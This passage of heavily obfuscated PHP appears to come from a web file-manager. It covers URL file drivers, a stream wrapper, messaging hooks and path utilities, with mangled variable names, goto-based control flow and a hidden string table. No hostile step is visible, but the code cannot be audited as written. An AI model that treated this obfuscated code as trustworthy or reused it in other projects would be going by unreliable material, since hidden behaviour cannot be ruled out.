self::textEncode($aŞ±æĞ²£§); $eŒ£İ§ÜÔ× = array($EöÑî“íÊï[29] => $d‹Ìø•, $EöÑî“íÊï[93] => $fÈ¶„¼ñç, $EöÑî“íÊï[372] => $aŞ±æĞ²£§); $AÉƒÂêóÁù[] = $this->filterWhere($eŒ£İ§ÜÔ×); } if (!$AÉƒÂêóÁù) { return !0; } goto eãßñ‡Ù¹Ì; eÊÜÉ×ùÑÂ: } protected function optionDefault($cÑë•Â¶Ë¬ = '') { return !1; } public function setDeep($fáÍ«ÖëÍõ, $eáèôÌÛ¸ = false, $aè¹æÖ’Œ¦ = '') { $C„ØÙ—Òá» = explode($_SERVER[«¾°Ã¤][95], $fáÍ«ÖëÍõ); $CÅ™ù¡Š„° = $this->get(); array_set_value($CÅ™ù¡Š„°, $fáÍ«ÖëÍõ, $eáèôÌÛ¸); $this->set($C„ØÙ—Òá»[0], $CÅ™ù¡Š„°[$C„ØÙ—Òá»[0]], $aè¹æÖ’Œ¦); } public function remove($e©£ÒæÖ©¥, $FÍ‘‰²öî = '') { $D»Àê Ùø =& $_SERVER[«¾°Ã¤]; $this->cacheRemove($FÍ‘‰²öî); $cÄÇïèó = $this->filterWhere(array($D»Àê Ùø[93] => $e©£ÒæÖ©¥, $D»Àê Ùø[29] => $FÍ‘‰²öî)); if (is_null($e©£ÒæÖ©¥)) { unset($cÄÇïèó[$D»Àê Ùø[93]]); } return $this->where($cÄÇïèó)->delete(); } public function cacheSet($A¨´†­åøİ, $a…÷ù°Ü¼µ = false) { return Cache::set($this->cacheKey($A¨´†­åøİ), $a…÷ù°Ü¼µ); } public function cacheGet($fÚ–Š±Ã» ) { return Cache::get($this->cacheKey($fÚ–Š±Ã» )); } public function cacheRemove($B¦ñ‡‡İÁó) { return Cache::remove($this->cacheKey($B¦ñ‡‡İÁó)); } protected function filterWhere($dÑÁà¬‘÷) { return $dÑÁà¬‘÷; } protected function cacheKey($eºõ“êŞæ) { return $eºõ“êŞæ; } } goto a´ÙÅñ³ªÒ; A²èÄùÓšË: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($fñ¬±ÕÆ = false) { } public function exist($Eî³œ‹‡‹‰) { $f¥“°¢Ó¨ø = $this->info($Eî³œ‹‡‹‰); return $f¥“°¢Ó¨ø[$_SERVER[«¾°Ã¤][195]]; } public function isFile($BÉ™ƒ‹èº) { $d™Ìâ¿œĞ = $this->info($BÉ™ƒ‹èº); return $d™Ìâ¿œĞ[$_SERVER[«¾°Ã¤][195]]; } public function isFolder($EØë„•´) { return !1; } public function size($CïÙĞí×ÓÌ) { $EìÄ‚¶¦ğ± = $this->info($CïÙĞí×ÓÌ); return $EìÄ‚¶¦ğ±[$_SERVER[«¾°Ã¤][78]]; } public function info($bôÍÑ£˜ŞÂ) { return $this->infoParse($bôÍÑ£˜ŞÂ); } public function infoAuth($b¹Ì£¾İí¶) { return $this->infoParse($b¹Ì£¾İí¶); } public function infoWithChildren($CÎ¸È¤®¢æ) { return $this->infoParse($CÎ¸È¤®¢æ); } public function infoFull($fØô£’Á…Õ) { return $this->infoParse($fØô£’Á…Õ); } private function infoParse($Aœ‰„Šï›) { $FšÒ…©êœÙ =& $_SERVER[«¾°Ã¤]; $Bİ¢‚…­é = $this->header($Aœ‰„Šï›); if (!$Bİ¢‚…­é || !$Bİ¢‚…­é[$FšÒ…©êœÙ[719]]) { return !1; } $BÙ‚–Æµ = _get($Bİ¢‚…­é, $FšÒ…©êœÙ[335], 0); $FãÏŠŠÌ·¿ = array($FšÒ…©êœÙ[28] => $Bİ¢‚…­é[$FšÒ…©êœÙ[28]], $FšÒ…©êœÙ[76] => $Aœ‰„Šï›, $FšÒ…©êœÙ[29] => $FšÒ…©êœÙ[193], $FšÒ…©êœÙ[78] => intval($BÙ‚–Æµ), $FšÒ…©êœÙ[168] => get_path_ext($Bİ¢‚…­é[$FšÒ…©êœÙ[28]]), $FšÒ…©êœÙ[1257] => $BÙ‚–Æµ > 0 && $Bİ¢‚…­é[$FšÒ…©êœÙ[1379]], $FšÒ…©êœÙ[1258] => !1); return $FãÏŠŠÌ·¿; } private function header($dÉã£Û•¿) { goto Dõ½êÇå‰; EÑ‘­ÁÉ±¢: return self::$_cacheHeader[$dÉã£Û•¿]; goto A˜Ëñ‘ Ø×; A†Î‡ÕÀ¥: $GLOBALS[$b»øõÈ¥¼[1380]] = !0; self::$_cacheHeader[$dÉã£Û•¿] = url_header($dÉã£Û•¿); $GLOBALS[$b»øõÈ¥¼[1380]] = $Eàâø„©; goto EÑ‘­ÁÉ±¢; Dõ½êÇå‰: $b»øõÈ¥¼ =& $_SERVER[«¾°Ã¤]; if (isset(self::$_cacheHeader[$dÉã£Û•¿])) { return self::$_cacheHeader[$dÉã£Û•¿]; } $Eàâø„© = isset($GLOBALS[$b»øõÈ¥¼[1380]]) ? $GLOBALS[$b»øõÈ¥¼[1380]] : !1; goto A†Î‡ÕÀ¥; A˜Ëñ‘ Ø×: } public function hashSimple($DííÓì»Í, $f«¼èÃ×éÏ = false) { goto C˜¯è¨ÕÕ; A‡Î¶â”×ô: if ($AÎ¼Í³µÎÖ <= $aôŒËªñ•· * $cÜŠá¢ğ) { return md5($this->fileSubstr($DííÓì»Í, 0, $AÎ¼Í³µÎÖ)) . $AÎ¼Í³µÎÖ; } $eÀ¾¨’“­‡ = intval($AÎ¼Í³µÎÖ / $cÜŠá¢ğ); $a½ğä…Â¼Ç = $eÚêŠ†ÆÇÄ[33]; goto bªĞÒè½˜; bªĞÒè½˜: $dÏãêÇ˜§• = timeFloat(); $BíªÌÍ¿‘ = 15; for ($c¬ò™¤Â†§ = 0; $c¬ò™¤Â†§ < $cÜŠá¢ğ; $c¬ò™¤Â†§++) { if (timeFloat() - $dÏãêÇ˜§• > $BíªÌÍ¿‘) { return !1; } $c™ÉâŸÓñí = $this->fileSubstr($DííÓì»Í, $eÀ¾¨’“­‡ * $c¬ò™¤Â†§, $aôŒËªñ•·); if (!$c™ÉâŸÓñí) { return !1; } $a½ğä…Â¼Ç .= $c™ÉâŸÓñí; } goto C±ÙíŠ¤ˆ; D›Èä…°›: $AÎ¼Í³µÎÖ = $cÌƒ“÷ä…[$eÚêŠ†ÆÇÄ[78]]; $aôŒËªñ•· = 200; $cÜŠá¢ğ = 50; goto A‡Î¶â”×ô; C˜¯è¨ÕÕ: $eÚêŠ†ÆÇÄ =& $_SERVER[«¾°Ã¤]; $cÌƒ“÷ä… = $this->info($DííÓì»Í); if (!$cÌƒ“÷ä… || !$cÌƒ“÷ä…[$eÚêŠ†ÆÇÄ[195]]) { return !1; } goto D›Èä…°›; C±ÙíŠ¤ˆ: $a½ğä…Â¼Ç .= $this->fileSubstr($DííÓì»Í, $AÎ¼Í³µÎÖ - $aôŒËªñ•·, $aôŒËªñ•·); return md5($a½ğä…Â¼Ç) . $AÎ¼Í³µÎÖ; goto cÑÆç±‰ˆœ; cÑÆç±‰ˆœ: } public function getContent($BÃ ±®•·¹) { return $this->fileSubstr($BÃ ±®•·¹); } public function fileSubstr($dš´«ò£Ş, $fˆ¿â®ßğÆ = 0, $AË½´‘ÙÃ = -1) { goto b­¥Ü…ÉÈ±; fàÓ¡Å’œ: if ($AË½´‘ÙÃ === -1) { $AË½´‘ÙÃ = $AïßÌ·…Ëä[$D´ÀÁ¬âÀ[78]]; } if ($AË½´‘ÙÃ == 0) { return $D´ÀÁ¬âÀ[33]; } $dÓé—Õ‡‘Ñ = array($D´ÀÁ¬âÀ[1381] . $fˆ¿â®ßğÆ . $D´ÀÁ¬âÀ[753] . ($fˆ¿â®ßğÆ + $AË½´‘ÙÃ - 1)); goto A¥ßˆ”ˆãš; b­¥Ü…ÉÈ±: $D´ÀÁ¬âÀ =& $_SERVER[«¾°Ã¤]; $AïßÌ·…Ëä = $this->info($dš´«ò£Ş); if (!$AïßÌ·…Ëä || !$AïßÌ·…Ëä[$D´ÀÁ¬âÀ[195]] && $AïßÌ·…Ëä[$D´ÀÁ¬âÀ[78]] > 1024 * 1024 * 10) { return !1; } goto fàÓ¡Å’œ; A¥ßˆ”ˆãš: $B¡¨ùçßŠÔ = url_request($dš´«ò£Ş, $D´ÀÁ¬âÀ[228], !1, $dÓé—Õ‡‘Ñ, !1, !1, 1); return $B¡¨ùçßŠÔ[$D´ÀÁ¬âÀ[1089]] ? $B¡¨ùçßŠÔ[$D´ÀÁ¬âÀ[1089]] : $D´ÀÁ¬âÀ[33]; goto E‰‰ª´ì ; E‰‰ª´ì : } public function download($BÖìÆÚÚ„Ê, $fÃÅ‚ê ñ‰) { Downloader::start($BÖìÆÚÚ„Ê, $fÃÅ‚ê ñ‰); return $fÃÅ‚ê ñ‰; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($BäÄ¤Óæ»‹, $b˜›ó¥¦“¾ = '') { goto e…‘ÍåÊ—; cƒ ¼‡³‡: if (!isset(self::$_chunkBuffer[$BäÄ¤Óæ»‹])) { self::$_chunkBuffer[$BäÄ¤Óæ»‹] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto a‰ÃØÇ °ï; c×šÉùéæÙ: $this->pathOpen = $BäÄ¤Óæ»‹; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto cƒ ¼‡³‡; e…‘ÍåÊ—: $this->info = $this->info($BäÄ¤Óæ»‹); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[«¾°Ã¤][76]]; goto c×šÉùéæÙ; a‰ÃØÇ °ï: } function stream_read($a ´ÅÍ®ƒ¸) { $CŒßàŒ¢½ = $this->fileSubstr($this->pose, $a ´ÅÍ®ƒ¸); $this->pose += strlen($CŒßàŒ¢½); return $CŒßàŒ¢½; } public function stream_tell() { return $this->pose; } public function stream_seek($b„Áâ·¸‚ˆ, $b®ÀÀ©¡ø´) { $aõÒÄ©²ùõ =& $_SERVER[«¾°Ã¤]; if ($b®ÀÀ©¡ø´ == SEEK_SET) { $this->pose = $b„Áâ·¸‚ˆ; } else { if ($b®ÀÀ©¡ø´ == SEEK_CUR) { $this->pose += $b„Áâ·¸‚ˆ; } else { if ($b®ÀÀ©¡ø´ == SEEK_END) { $this->pose = $this->info[$aõÒÄ©²ùõ[78]] + intval($b„Áâ·¸‚ˆ); } } } if ($b„Áâ·¸‚ˆ < 0) { $this->pose = $this->info[$aõÒÄ©²ùõ[78]] + $b„Áâ·¸‚ˆ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[«¾°Ã¤][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($E½‚°åà§Ñ, $dò‹×Áãƒ™) { $eˆ—‚ºçº =& $_SERVER[«¾°Ã¤]; $c«Œ –×„ç = $this->info($E½‚°åà§Ñ); return array($eˆ—‚ºçº[1382] => 0, $eˆ—‚ºçº[1383] => 0, $eˆ—‚ºçº[12] => 32768 + 511, $eˆ—‚ºçº[1384] => 0, $eˆ—‚ºçº[1385] => 0, $eˆ—‚ºçº[1386] => 0, $eˆ—‚ºçº[1387] => 0, $eˆ—‚ºçº[78] => $c«Œ –×„ç[$eˆ—‚ºçº[78]], $eˆ—‚ºçº[1388] => $c«Œ –×„ç[$eˆ—‚ºçº[1256]], $eˆ—‚ºçº[1344] => $c«Œ –×„ç[$eˆ—‚ºçº[84]], $eˆ—‚ºçº[1343] => $c«Œ –×„ç[$eˆ—‚ºçº[194]], $eˆ—‚ºçº[1389] => 0, $eˆ—‚ºçº[1390] => 0); } static $fileInfo = array(); public function info($E”È¹‡¬‹) { $aŞğ­»‹¾ = $_SERVER[«¾°Ã¤][1391]; if (isset(self::$fileInfo[$E”È¹‡¬‹])) { return self::$fileInfo[$E”È¹‡¬‹]; } if (substr($E”È¹‡¬‹, 0, strlen($aŞğ­»‹¾)) != $aŞğ­»‹¾) { return !1; } self::$fileInfo[$E”È¹‡¬‹] = IO::info(substr($E”È¹‡¬‹, strlen($aŞğ­»‹¾))); return self::$fileInfo[$E”È¹‡¬‹]; } public static function read($b˜ö í×ğœ, $B‚µôÅÚ, $AÉŒØÉ”) { if (!isset(self::$_fopenCache[$b˜ö í×ğœ])) { $AªÙæ‚Õ·Ğ = new StreamWrapperIO(); $AªÙæ‚Õ·Ğ->stream_open($b˜ö í×ğœ); self::$_fopenCache[$b˜ö í×ğœ] = $AªÙæ‚Õ·Ğ; } $AªÙæ‚Õ·Ğ = self::$_fopenCache[$b˜ö í×ğœ]; return $AªÙæ‚Õ·Ğ->fileSubstr($B‚µôÅÚ, $AÉŒØÉ”); } public static function _read($Aºòéä‰Œ, $B‡©­ª“Â, $C­±ŒÛ¼óÚ) { goto BÙ»ÂëáÚø; DòÜàïñ¢Ã: return $EˆÇÅš¿Š; goto A¿å»·¸¯å; bÔïÒÍ‹‹: $fã‰ãí§Ó‹ = 0; while ($fã‰ãí§Ó‹ < $C­±ŒÛ¼óÚ) { $AÁä¯™‹­ä = min($f‘ºòÖî’, $C­±ŒÛ¼óÚ - $fã‰ãí§Ó‹); $EˆÇÅš¿Š .= fread($c™ÅÖÔ…î, $AÁä¯™‹­ä); $fã‰ãí§Ó‹ += $AÁä¯™‹­ä; } fclose($c™ÅÖÔ…î); goto DòÜàïñ¢Ã; EéßÔİá: $f‘ºòÖî’ = 8192; fseek($c™ÅÖÔ…î, $B‡©­ª“Â, SEEK_SET); $EˆÇÅš¿Š = $Cµ¥†„ßÑ[33]; goto bÔïÒÍ‹‹; BÙ»ÂëáÚø: $Cµ¥†„ßÑ =& $_SERVER[«¾°Ã¤]; $c™ÅÖÔ…î = fopen($Aºòéä‰Œ, $Cµ¥†„ßÑ[1260]); if (!$c™ÅÖÔ…î) { return $Cµ¥†„ßÑ[33]; } goto EéßÔİá; A¿å»·¸¯å: } public function fileSubstr($dêˆÜµ©êã, $C–®›çù‹) { goto A·¨»¤áÊ; F¨æí´å¹: $a÷îìİ»Ò‚ = 0; $Eº¨›èâÎí = 0; $AŠ‡¸¡Ö± = $eÔæïİ×Ù[33]; goto a–ÔŞÂ…÷˜; c›âŠ‹÷ø¬: $F¤…‹ï³Í± = 64 * 1024; $díİ…¥¤…ø =& self::$_chunkBuffer[$this->path]; if (!$díİ…¥¤…ø) { $díİ…¥¤…ø = array(); } goto F¨æí´å¹; CÃ­Ø²‘õš: $fîˆªã«™À = ceil(($dêˆÜµ©êã + $C–®›çù‹) / $F¤…‹ï³Í±) * $F¤…‹ï³Í± - $EƒÓÜ„¢Ã; $a™¹¼ŠÀÓ³ = IO::fileSubstr($this->path, $EƒÓÜ„¢Ã, $fîˆªã«™À); $díİ…¥¤…ø[$EƒÓÜ„¢Ã . $eÔæïİ×Ù[33]] = $a™¹¼ŠÀÓ³; goto f½‘…ôÛº¤; bÚøéÊ¬Ë¦: $DÑ¾Â‚§» = $C–®›çù‹; if ($dêˆÜµ©êã < 0) { $dêˆÜµ©êã = $DÕêÈ—Ñë + $dêˆÜµ©êã; } if ($C–®›çù‹ === !1) { $C–®›çù‹ = $DÕêÈ—Ñë - $dêˆÜµ©êã; } goto f—ïøƒôéö; f—ïøƒôéö: if ($dêˆÜµ©êã + $C–®›çù‹ > $DÕêÈ—Ñë) { $C–®›çù‹ = $DÕêÈ—Ñë - $dêˆÜµ©êã; } if ($C–®›çù‹ <= 0) { return $eÔæïİ×Ù[33]; } if ($dêˆÜµ©êã < 0 || $dêˆÜµ©êã >= $DÕêÈ—Ñë || $C–®›çù‹ <= 0 || $C–®›çù‹ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\x69\x6c\145\122\145\141\144\40\x65\x72\x72\157\162\41\40\x73\164\141\x72\164\75{$dêˆÜµ©êã}\x3b\154\145\156\x67\164\150\75{$C–®›çù‹}\x3b\40\x73\x69\172\x65\x3d{$DÕêÈ—Ñë}\x3b"); } goto c›âŠ‹÷ø¬; f½‘…ôÛº¤: ksort($díİ…¥¤…ø); $fÂßĞ¦ã…§ = substr($a™¹¼ŠÀÓ³, $dêˆÜµ©êã - $EƒÓÜ„¢Ã, $C–®›çù‹); return $fÂßĞ¦ã…§; goto Aˆ¦¨Ö™å; A·¨»¤áÊ: $eÔæïİ×Ù =& $_SERVER[«¾°Ã¤]; $DÕêÈ—Ñë = $this->info[$eÔæïİ×Ù[78]]; $a²ÅÙÙ…Ê‘ = $dêˆÜµ©êã; goto bÚøéÊ¬Ë¦; a–ÔŞÂ…÷˜: foreach ($díİ…¥¤…ø as $a÷îìİ»Ò‚ => $AŠ‡¸¡Ö±) { $a÷îìİ»Ò‚ = intval($a÷îìİ»Ò‚); $Eº¨›èâÎí = $a÷îìİ»Ò‚ + strlen($AŠ‡¸¡Ö±); if ($dêˆÜµ©êã >= $Eº¨›èâÎí) { continue; } if ($dêˆÜµ©êã >= $a÷îìİ»Ò‚ && $dêˆÜµ©êã + $C–®›çù‹ <= $Eº¨›èâÎí) { return substr($AŠ‡¸¡Ö±, $dêˆÜµ©êã - $a÷îìİ»Ò‚, $C–®›çù‹); } break; } if (count($díİ…¥¤…ø) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($eÔæïİ×Ù[1392], $eÔæïİ×Ù[1393] . count($díİ…¥¤…ø) . "\x3b\163\164\x61\x72\164\x3d{$dêˆÜµ©êã}\54\154\x65\x6e\147\164\150\x3d{$C–®›çù‹}\73\x70\157\163\x65\x3a{$a÷îìİ»Ò‚}\x7e{$Eº¨›èâÎí}"); throw new Exception($eÔæïİ×Ù[1394]); } $EƒÓÜ„¢Ã = intval($dêˆÜµ©êã / $F¤…‹ï³Í±) * $F¤…‹ï³Í±; goto CÃ­Ø²‘õš; Aˆ¦¨Ö™å: } private function log($dìŸ÷ÃƒÂä, $EøÚ÷îèÏ‘) { $e‡š¨³š– =& $_SERVER[«¾°Ã¤]; $C¯‡ùêå¼É = timeFloat() - $this->timeStart; write_log(sprintf($e‡š¨³š–[1395], $dìŸ÷ÃƒÂä, $this->info[$e‡š¨³š–[28]], $C¯‡ùêå¼É, $EøÚ÷îèÏ‘), $e‡š¨³š–[1079]); } } class Message { function __construct() { } public function send($cĞ¦ƒ‰… = '', $E¨Ñê¿Ìëî = array(), $fö¡ìÍô—è = "\164\x65\170\164") { goto a¹ÂËòë¹; A±²¸­Ñ´: $E¨Ñê¿Ìëî = array($e…”ÄÅÓÀ[1016] => isset($E¨Ñê¿Ìëî[$e…”ÄÅÓÀ[1016]]) ? $E¨Ñê¿Ìëî[$e…”ÄÅÓÀ[1016]] : $e…”ÄÅÓÀ[33], $e…”ÄÅÓÀ[571] => isset($E¨Ñê¿Ìëî[$e…”ÄÅÓÀ[571]]) ? $E¨Ñê¿Ìëî[$e…”ÄÅÓÀ[571]] : $e…”ÄÅÓÀ[33]); if (empty($cĞ¦ƒ‰…) || empty($E¨Ñê¿Ìëî[$e…”ÄÅÓÀ[1016]]) && empty($E¨Ñê¿Ìëî[$e…”ÄÅÓÀ[571]])) { return !1; } $còÁĞ»®šÀ = array($e…”ÄÅÓÀ[1337] => $BĞî‚â£½—, $e…”ÄÅÓÀ[1398] => $E¨Ñê¿Ìëî); goto aÓš éŒ°; a¹ÂËòë¹: $e…”ÄÅÓÀ =& $_SERVER[«¾°Ã¤]; $BĞî‚â£½— = array($e…”ÄÅÓÀ[29] => $e…”ÄÅÓÀ[1396], $e…”ÄÅÓÀ[724] => $cĞ¦ƒ‰…); if (in_array($fö¡ìÍô—è, array($e…”ÄÅÓÀ[1396], $e…”ÄÅÓÀ[1397]))) { $BĞî‚â£½—[$e…”ÄÅÓÀ[29]] = $fö¡ìÍô—è; } goto A±²¸­Ñ´; aÓš éŒ°: Hook::trigger($e…”ÄÅÓÀ[1399], $còÁĞ»®šÀ); goto eš¨ÏÎè; eš¨ÏÎè: } } goto aƒ¿—é÷¨Ş; B¦öëø‡º: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $dÌºÕã™‰ =& $_SERVER[«¾°Ã¤]; $this->objectDriver = array($dÌºÕã™‰[57], $dÌºÕã™‰[58], $dÌºÕã™‰[59], $dÌºÕã™‰[60], $dÌºÕã™‰[61], $dÌºÕã™‰[62], $dÌºÕã™‰[63], $dÌºÕã™‰[64], $dÌºÕã™‰[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($AÒªïÎÅãÕ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($AÒªïÎÅãÕ, $_SERVER[«¾°Ã¤][8]); } return $AÒªïÎÅãÕ; } public function iconvApp($bğËÇÕÎ ‡) { return $bğËÇÕÎ ‡; } public function iconvSystem($B§íÖŒø) { return $B§íÖŒø; } public function iconvTo($D“‡ÔÙ¿Û, $D¿‹»ù¤¡Ï, $f¥ˆäÆ¨‹Ë) { goto dŒË™çéä¤; dŒË™çéä¤: $Dõ¸¸¦õÏ =& $_SERVER[«¾°Ã¤]; if (!$D“‡ÔÙ¿Û || !function_exists($Dõ¸¸¦õÏ[66])) { return $D“‡ÔÙ¿Û; } static $dğîæäÁõê = array(); goto fÃ¨İİÕš; D¬´ÍÑšÏ: $cß‹„Ä«çÒ = $cß‹„Ä«çÒ ? $cß‹„Ä«çÒ : $D“‡ÔÙ¿Û; if (strstr($cß‹„Ä«çÒ, $Dõ¸¸¦õÏ[70])) { $cß‹„Ä«çÒ = str_replace($Dõ¸¸¦õÏ[70], $Dõ¸¸¦õÏ[71], $cß‹„Ä«çÒ); } $dğîæäÁõê[$D¿‹»ù¤¡Ï . $Dõ¸¸¦õÏ[67] . $f¥ˆäÆ¨‹Ë . $Dõ¸¸¦õÏ[68] . $D“‡ÔÙ¿Û] = $cß‹„Ä«çÒ; goto dÜİĞ£ˆ¦; bÙã„Å‰ìË: return $cß‹„Ä«çÒ; goto cù¨Ëƒ¿…; dÜİĞ£ˆ¦: $dğîæäÁõê[$f¥ˆäÆ¨‹Ë . $Dõ¸¸¦õÏ[67] . $D¿‹»ù¤¡Ï . $Dõ¸¸¦õÏ[68] . $D“‡ÔÙ¿Û] = $D“‡ÔÙ¿Û; $dğîæäÁõê[$f¥ˆäÆ¨‹Ë . $Dõ¸¸¦õÏ[67] . $D¿‹»ù¤¡Ï . $Dõ¸¸¦õÏ[68] . $cß‹„Ä«çÒ] = $D“‡ÔÙ¿Û; $dğîæäÁõê[$D¿‹»ù¤¡Ï . $Dõ¸¸¦õÏ[67] . $f¥ˆäÆ¨‹Ë . $Dõ¸¸¦õÏ[68] . $cß‹„Ä«çÒ] = $cß‹„Ä«çÒ; goto bÙã„Å‰ìË; fÃ¨İİÕš: $f§ÉÙ‚‚ğ = $D¿‹»ù¤¡Ï . $Dõ¸¸¦õÏ[67] . $f¥ˆäÆ¨‹Ë . $Dõ¸¸¦õÏ[68] . $D“‡ÔÙ¿Û; if (isset($dğîæäÁõê[$f§ÉÙ‚‚ğ])) { return $dğîæäÁõê[$f§ÉÙ‚‚ğ]; } if (function_exists($Dõ¸¸¦õÏ[69])) { $cß‹„Ä«çÒ = @mb_convert_encoding($D“‡ÔÙ¿Û, $f¥ˆäÆ¨‹Ë, $D¿‹»ù¤¡Ï); } else { $cß‹„Ä«çÒ = @iconv($D¿‹»ù¤¡Ï, $f¥ˆäÆ¨‹Ë, $D“‡ÔÙ¿Û); } goto D¬´ÍÑšÏ; cù¨Ëƒ¿…: } public function getPathInner($f®Úß¶±ëö) { $F«ºÛ†±Ü = IO::init($f®Úß¶±ëö); return $F«ºÛ†±Ü->path; } public function getPathOuter($fÖÍÇÉê°) { $C„½¡ÎÅ÷Ş =& $_SERVER[«¾°Ã¤]; $aĞÊè¦ƒ¾¼ = strlen(trim($this->pathBase, $C„½¡ÎÅ÷Ş[8])); $fÖÍÇÉê° = substr(trim($fÖÍÇÉê°, $C„½¡ÎÅ÷Ş[8]), $aĞÊè¦ƒ¾¼); return $this->pathDriver . $C„½¡ÎÅ÷Ş[8] . ltrim($fÖÍÇÉê°, $C„½¡ÎÅ÷Ş[8]); } public function isParentOf($BŠ¦ŠàŞáí, $CàÕÚ¶ïºİ) { $e“«¼ÍÆ¦ã =& $_SERVER[«¾°Ã¤]; $BŠ¦ŠàŞáí = rtrim(strtolower($BŠ¦ŠàŞáí), $e“«¼ÍÆ¦ã[8]) . $e“«¼ÍÆ¦ã[8]; $CàÕÚ¶ïºİ = rtrim(strtolower($CàÕÚ¶ïºİ), $e“«¼ÍÆ¦ã[8]) . $e“«¼ÍÆ¦ã[8]; $fè–»ùÉÛÈ = strpos($CàÕÚ¶ïºİ, $BŠ¦ŠàŞáí) === 0; return $fè–»ùÉÛÈ; } public function getType() { $e¿ˆ“³Şš· =& $_SERVER[«¾°Ã¤]; $eíŸÔÚÁ©Ô = str_replace($e¿ˆ“³Şš·[72], $e¿ˆ“³Şš·[33], get_class($this)); return strtolower($eíŸÔÚÁ©Ô); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($D“ğ™º¸¥, $c‡‡åÕ‘Ü‹) { $c‚é…µ§‘ =& $_SERVER[«¾°Ã¤]; $bŠÃŞ˜÷À = rtrim($D“ğ™º¸¥, $c‚é…µ§‘[8]) . $c‚é…µ§‘[8] . $c‡‡åÕ‘Ü‹; $F…Ù°§“µè = $this->exist($bŠÃŞ˜÷À); return $F…Ù°§“µè ? $bŠÃŞ˜÷À : !1; } public function setModifyTime($D‹ÒÃøÀ¢, $eñ¬ñÑ·Š = '') { } public function renameObject($e«ŸïõÚ¦å, $b­ŠÎŠµ¿™) { goto fƒÒ¥§èïã; fƒÒ¥§èïã: $bÌ»£Ì¦ªê =& $_SERVER[«¾°Ã¤]; $bŒÏ¬ª” = $b­ŠÎŠµ¿™; Hook::trigger($bÌ»£Ì¦ªê[73], $this, $e«ŸïõÚ¦å, $this, $this->pathFather($e«ŸïõÚ¦å) . $b­ŠÎŠµ¿™); goto cÆëñ›“±»; eÕˆ³’›ö£: return $a›ÙõğÈ¤› ? $b­ŠÎŠµ¿™ : !1; goto D£Æ¥Ç—; cÆëñ›“±»: $e«ŸïõÚ¦å = $this->getPathOuter($e«ŸïõÚ¦å); $b­ŠÎŠµ¿™ = $this->pathFather($e«ŸïõÚ¦å) . $b­ŠÎŠµ¿™; if (IO::isFile($e«ŸïõÚ¦å)) { $a›ÙõğÈ¤› = IO::copy($e«ŸïõÚ¦å, $this->pathFather($e«ŸïõÚ¦å), REPEAT_RENAME_FOLDER, $bŒÏ¬ª”); if ($a›ÙõğÈ¤›) { IO::remove($e«ŸïõÚ¦å); } } else { $a›ÙõğÈ¤› = IO::mkdir($b­ŠÎŠµ¿™); if (!$a›ÙõğÈ¤›) { return !1; } $c©ãá×©êˆ = IO::listPath($e«ŸïõÚ¦å, !0); $A•çêå‹ï = array_merge($c©ãá×©êˆ[$bÌ»£Ì¦ªê[74]], $c©ãá×©êˆ[$bÌ»£Ì¦ªê[75]]); foreach ($A•çêå‹ï as $bÖÕ‘­Ùôğ) { IO::move($bÖÕ‘­Ùôğ[$bÌ»£Ì¦ªê[76]], $b­ŠÎŠµ¿™, REPEAT_RENAME_FOLDER); } IO::remove($e«ŸïõÚ¦å); } goto eÕˆ³’›ö£; D£Æ¥Ç—: } public function tempFile($B”ÊÎİÀ‘‚ = '', $B®¥à¦§°½ = '') { goto b²°ÃìÍ—; b²°ÃìÍ—: if (!$B”ÊÎİÀ‘‚) { $B”ÊÎİÀ‘‚ = rand_string(15); } $f‚Œ¹ªÜ’ = TEMP_FILES . rand_string(15) . $_SERVER[«¾°Ã¤][8]; @mkdir($f‚Œ¹ªÜ’, 511, !0); goto E¤ŒïÆ–­ğ; E±ë™Á½£”: return $då†õ«šò¡; goto Aª³Æ”ç•·; E¤ŒïÆ–­ğ: $då†õ«šò¡ = $f‚Œ¹ªÜ’ . $B”ÊÎİÀ‘‚; @touch($då†õ«šò¡); if ($B®¥à¦§°½) { file_put_contents($då†õ«šò¡, $B®¥à¦§°½); } goto E±ë™Á½£”; Aª³Æ”ç•·: } public function tempFileRemve($d’Œ¸ïÍ†Ş) { @unlink($d’Œ¸ïÍ†Ş); @rmdir($this->pathFather($d’Œ¸ïÍ†Ş)); } public function mkfile($CÌÓ ‘©ÅÈ, $Aøìëè­“Ö = '', $d«¢í¾±å = REPEAT_RENAME) { } public function mkdir($AŞª‰±½ÍÆ, $fá¶»ğ…šó = REPEAT_SKIP) { } public function delFile($a’ôÜÀÁßÅ) { } public function delFolder($eÊçíä†Ã) { } public function copyFile($fÆ´öŠ«, $a…™ê±µ¡°) { } public function moveFile($CÆÒğµ’¤Ã, $cÅñŸ¢ÂÏö) { } public function remove($e‹œˆ‡‰ëÈ) { if ($this->isFile($e‹œˆ‡‰ëÈ)) { return $this->delFile($e‹œˆ‡‰ëÈ); } return $this->delFolder($e‹œˆ‡‰ëÈ); } public function rename($E´¡Õ¤÷Ã¨, $Dİ‹ÔôƒÌ‹) { } public function exist($Fõø«Ôİ¢) { } public function findByHash($fÌ•ŠÒÜŠ® = '', $C×¼¦­‚Ä = '') { return !1; } public function isFile($CÇìŠÉè…÷) { } public function isFolder($B¯¨›ä£“) { } public function size($eÂ¾ù˜±š¼) { } public function info($f¢¨î‘Åë) { } public function infoSimple($bŒ¥âŞ‹˜é) { return $this->info($bŒ¥âŞ‹˜é); } public function infoAuth($d°ŠÑŒª‹à) { return $this->info($d°ŠÑŒª‹à); } public function infoFull($EäÖ½ôøÁ) { return $this->info($EäÖ½ôøÁ); } public function infoWithChildren($fÔÍóÇË’) { $CÇÖ©±—ã” =& $_SERVER[«¾°Ã¤]; static 